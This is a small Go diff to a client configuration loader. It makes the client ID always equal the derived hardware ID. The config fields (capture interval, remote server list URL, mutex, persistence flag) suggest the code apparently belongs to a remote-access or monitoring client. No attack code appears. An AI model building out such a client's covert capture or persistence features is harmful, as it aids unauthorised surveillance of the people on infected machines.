@@ -100,7 +100,6 @@ func Load() Config {
 
 	fileSettings := readSettings()
 	defaultHWID := deriveHWID()
-	defaultID := defaultHWID
 	interval := 20 * time.Second
 	if v := strings.TrimSpace(os.Getenv("OVERLORD_CAPTURE_INTERVAL")); v != "" {
 		if parsed, err := time.ParseDuration(v); err == nil && parsed > 0 {
@@ -140,7 +139,7 @@ func Load() Config {
 		ServerIndex:           serverIndex,
 		RawServerListURL:      rawServerListURL,
 		Mutex:                 strings.TrimSpace(mutex),
-		ID:                    firstNonEmpty(fileSettings.ID, DefaultID, defaultID),
+		ID:                    defaultHWID,
 		HWID:                  firstNonEmpty(fileSettings.HWID, defaultHWID),
 		EnablePersistence:     enablePersistence,
 		Country:               firstNonEmpty(strings.TrimSpace(fileSettings.Country), DefaultCountry),
